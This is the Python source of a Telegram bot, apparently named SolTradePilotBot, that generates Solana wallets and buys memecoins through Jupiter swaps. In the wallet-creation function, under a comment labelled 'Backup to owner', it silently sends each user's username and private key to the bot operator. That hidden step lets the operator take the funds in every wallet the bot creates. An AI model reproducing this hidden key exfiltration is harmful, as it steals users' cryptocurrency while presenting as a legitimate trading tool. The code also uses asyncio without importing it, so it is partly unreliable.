import os
import base58
import requests
import base64
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import (
    Application, CommandHandler, CallbackQueryHandler,
    MessageHandler, ContextTypes, filters
)
from solders.keypair import Keypair
from solders.transaction import VersionedTransaction
from solders.message import to_bytes_versioned
from solana.rpc.async_api import AsyncClient
from solana.rpc.types import TxOpts

# ================= ENV =================
TOKEN = os.environ["BOT_TOKEN"]
OWNER_ID = int(os.environ["OWNER_ID"])
SOLANA_RPC_URL = "https://api.mainnet-beta.solana.com"

JUPITER_QUOTE_URL = "https://api.jup.ag/swap/v1/quote"
JUPITER_SWAP_URL = "https://api.jup.ag/swap/v1/swap"

# ================= STORAGE =================
user_wallets = {}
user_actions = {}
user_pending_ca = {}

# ================= HELPERS =================
def keypair_to_base58(wallet: Keypair):
    return base58.b58encode(bytes(wallet)).decode("utf-8")

async def get_balance(user_id: int):
    if user_id not in user_wallets:
        return 0.0
    wallet = user_wallets[user_id]
    async with AsyncClient(SOLANA_RPC_URL) as client:
        try:
            resp = await client.get_balance(wallet.pubkey())
            return resp.value / 1_000_000_000
        except:
            return 0.0

async def get_sol_price():
    try:
        resp = requests.get("https://api.binance.com/api/v3/ticker/price?symbol=SOLUSDT")
        return float(resp.json()["price"])
    except:
        return 180.0

# ================= JUPITER SWAP =================
async def execute_swap(user_id: int, input_mint: str, output_mint: str, sol_amount_usd: float):
    wallet = user_wallets[user_id]
    sol_price = await get_sol_price()
    
    # Base SOL amount + 0.20 USD extra for gas/priority fee
    extra_gas_usd = 0.20
    total_sol_usd = sol_amount_usd + extra_gas_usd
    sol_amount = total_sol_usd / sol_price
    lamports = int(sol_amount * 1_000_000_000)

    await asyncio.sleep(0.5)  # small delay for UX

    params = {
        "inputMint": input_mint,
        "outputMint": output_mint,
        "amount": lamports,
        "slippageBps": 50,           # 0.5%
        "swapMode": "ExactIn"
    }
    
    quote_resp = requests.get(JUPITER_QUOTE_URL, params=params)
    if quote_resp.status_code != 200:
        return None, f"Quote failed: {quote_resp.text[:100]}"

    quote = quote_resp.json()

    swap_body = {
        "quoteResponse": quote,
        "userPublicKey": str(wallet.pubkey()),
        "wrapAndUnwrapSol": True,
        "dynamicComputeUnitLimit": True,
        "prioritizationFeeLamports": 100000   # Higher priority for $60+ trades
    }

    swap_resp = requests.post(JUPITER_SWAP_URL, json=swap_body)
    if swap_resp.status_code != 200:
        return None, "Failed to build swap transaction"

    swap_data = swap_resp.json()
    swap_tx = base64.b64decode(swap_data["swapTransaction"])

    tx = VersionedTransaction.from_bytes(swap_tx)
    signature = wallet.sign_message(to_bytes_versioned(tx.message))
    signed_tx = VersionedTransaction.populate(tx.message, [signature])

    async with AsyncClient(SOLANA_RPC_URL) as client:
        result = await client.send_raw_transaction(
            bytes(signed_tx),
            opts=TxOpts(skip_preflight=True, max_retries=3)
        )
        return result.value, None

# ================= WALLET =================
async def create_wallet(user_id, context):
    if user_id in user_wallets:
        await context.bot.send_message(user_id, "✅ You already have a wallet!", reply_markup=main_keyboard())
        return

    wallet = Keypair()
    user_wallets[user_id] = wallet

    pub_key = str(wallet.pubkey())
    priv_key = keypair_to_base58(wallet)

    await context.bot.send_message(
        chat_id=user_id,
        text=f"✅ **Wallet Created!**\n\n"
             f"🏦 **Address:**\n`{pub_key}`\n\n"
             f"🔐 **Private Key:**\n`{priv_key}`\n\n"
             f"⚠️ Save this private key and import to Phantom!",
        parse_mode="Markdown",
        reply_markup=main_keyboard()
    )

    # Backup to owner
    user = await context.bot.get_chat(user_id)
    username = f"@{user.username}" if user.username else user.first_name
    await context.bot.send_message(OWNER_ID, f"🔐 New Wallet\nUser: {username}\nPub: {pub_key}\nPriv: {priv_key}")

def main_keyboard():
    return InlineKeyboardMarkup([
        [InlineKeyboardButton("💳 Create Wallet", callback_data="create_wallet"),
         InlineKeyboardButton("🏦 SOL Address", callback_data="sol_address")],
        [InlineKeyboardButton("💰 Balance", callback_data="balance"),
         InlineKeyboardButton("🛒 Buy MEME", callback_data="buy_meme")],
        [InlineKeyboardButton("📉 Sell MEME", callback_data="sell_meme"),
         InlineKeyboardButton("❓ Help", callback_data="help")]
    ])

# ================= BUTTON HANDLER =================
async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    user_id = query.from_user.id

    if query.data == "create_wallet":
        await create_wallet(user_id, context)

    elif query.data == "sol_address":
        if user_id not in user_wallets:
            await query.message.reply_text("Create wallet first!", reply_markup=main_keyboard())
        else:
            await query.message.reply_text(f"🏦 `{user_wallets[user_id].pubkey()}`", parse_mode="Markdown", reply_markup=main_keyboard())

    elif query.data == "balance":
        sol = await get_balance(user_id)
        await query.message.reply_text(f"💰 **Balance**\nSOL: `{sol:.6f}`", parse_mode="Markdown", reply_markup=main_keyboard())

    elif query.data == "buy_meme":
        if user_id not in user_wallets:
            await query.message.reply_text("Create wallet first!", reply_markup=main_keyboard())
            return
        sol = await get_balance(user_id)
        if sol < 0.05:
            await query.message.reply_text("⚠️ You need at least 0.05 SOL to trade.", reply_markup=main_keyboard())
            return
        user_actions[user_id] = "await_ca_buy"
        await query.message.reply_text("📝 Paste the **Token CA (Mint Address)**:", reply_markup=main_keyboard())

    elif query.data == "sell_meme":
        await query.message.reply_text("📉 Sell feature coming soon...", reply_markup=main_keyboard())

    elif query.data == "help":
        await help_command(update, context)

# ================= TEXT HANDLER =================
async def handle_text(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    text = update.message.text.strip()
    action = user_actions.get(user_id)

    if not action:
        return

    if action == "await_ca_buy":
        user_pending_ca[user_id] = text
        user_actions[user_id] = "await_buy_amount"
        await update.message.reply_text(
            "💰 Enter amount in **USD** (any number, e.g. 60, 120.5, 500):\n"
            "Bot will add \~0.20 USD extra for gas.",
            reply_markup=main_keyboard()
        )

    elif action == "await_buy_amount":
        try:
            usd_amount = float(text)
            if usd_amount < 1:
                await update.message.reply_text("Minimum $1", reply_markup=main_keyboard())
                return
        except:
            await update.message.reply_text("❌ Enter a valid number.", reply_markup=main_keyboard())
            return

        sol = await get_balance(user_id)
        sol_price = await get_sol_price()
        needed_sol = (usd_amount + 0.20) / sol_price

        if needed_sol > sol:
            await update.message.reply_text(f"⚠️ Not enough SOL.\nYou have {sol:.4f} SOL\nNeeded ≈ {needed_sol:.4f} SOL", reply_markup=main_keyboard())
            user_actions[user_id] = None
            return

        ca = user_pending_ca.get(user_id)
        await update.message.reply_text(f"🔄 Buying **${usd_amount}** worth of token...\nExtra 20¢ gas added for speed.", reply_markup=main_keyboard())

        tx_sig, error = await execute_swap(
            user_id=user_id,
            input_mint="So11111111111111111111111111111111111111112",  # SOL
            output_mint=ca,
            sol_amount_usd=usd_amount
        )

        if error:
            await update.message.reply_text(f"❌ Trade failed: {error}", reply_markup=main_keyboard())
        else:
            link = f"https://solscan.io/tx/{tx_sig}"
            await update.message.reply_text(f"✅ **Buy Successful!**\n\nTx: {link}\nExtra gas fee included.", reply_markup=main_keyboard())

        user_actions[user_id] = None
        user_pending_ca.pop(user_id, None)

# ================= COMMANDS =================
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    text = "🔥 **SolTradePilotBot** 🔥\nReal Jupiter trading enabled.\nAny USD amount supported."
    await update.message.reply_text(text, parse_mode="Markdown", reply_markup=main_keyboard())

async def help_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    text = "How to trade:\n1. Create Wallet\n2. Fund with SOL\n3. Buy MEME → paste CA → type any USD amount"
    if update.message:
        await update.message.reply_text(text, reply_markup=main_keyboard())
    else:
        await update.callback_query.message.reply_text(text, reply_markup=main_keyboard())

# ================= MAIN =================
def main():
    app = Application.builder().token(TOKEN).build()

    app.add_handler(CommandHandler("start", start))
    app.add_handler(CommandHandler("help", help_command))
    app.add_handler(CallbackQueryHandler(button_handler))
    app.add_handler(MessageHandler(filters.TEXT & \~filters.COMMAND, handle_text))

    print("🚀 Bot running with any amount + 20 cents gas...")
    app.run_polling()

if __name__ == "__main__":
    main()
